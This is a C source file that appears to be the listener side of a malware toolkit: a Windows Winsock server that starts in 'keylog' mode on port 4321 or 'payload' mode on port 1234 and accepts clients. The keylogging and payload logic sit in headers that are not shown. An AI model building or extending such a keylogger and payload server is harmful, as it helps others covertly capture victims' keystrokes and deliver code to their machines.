#include <winsock2.h>
#include <stdio.h>
#include "core/server-core.h"
#include "main.h"


BOOL parseArgs(int argc, char* argv[], Config* config) {
    if (argc < 2) {
        printf("[ERROR] No arguments provided.\n");
        return FALSE;
    }

    size_t len = strlen(argv[1]);
    if (len == 0) {
        printf("[ERROR] Argument argv[1] is empty.\n");
        return FALSE;
    }

    if (strncmp(argv[1], "--mode=", 7) == 0) {
        char* value = argv[1] + 7;
        if (strcmp(value, "payload") == 0 || strcmp(value, "keylog") == 0) {
            strcpy(config->mode, value);
            if (strcmp(value, "payload") == 0) {
                config->port = 1234;
            } else {
                config->port = 4321;
            }
            return TRUE;
        } else {
            printf("[ERROR] Unknown mode: %s\n", value);
            return FALSE;
        }
    } else {
        printf("[ERROR] Argument does not start with '--mode='\n");
        return FALSE;
    }
}

int main(int argc, char* argv[]) {
    Config config;
    if (!parseArgs(argc, argv, &config)) {
        printf("Provide parameter: --mode=keylog|payload\n");
        return 1;
    }

    WSADATA wsaData;
    SOCKET serverSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;
    BOOL wsaInitialized = FALSE;
    HANDLE thread = NULL;
    ThreadArgs* args = NULL;
    int socketResult = 0;

    if (!initializeServer(&serverSocket, &socketResult, &wsaInitialized, &wsaData, config.port)) {
        goto CLEANUP;
    }

    if (!acceptClientsLoop(&serverSocket, &clientSocket, thread, args, config.mode)) {
        goto CLEANUP;
    }

CLEANUP:
    if (clientSocket != INVALID_SOCKET) {
        closesocket(clientSocket);
    }
    if (serverSocket != INVALID_SOCKET) {
        closesocket(serverSocket);
    }
    if (wsaInitialized) {
        WSACleanup();
    }
    if (thread) {
        CloseHandle(thread);
    }
    if (args) {
        free(args);
    }
    return 0;
}
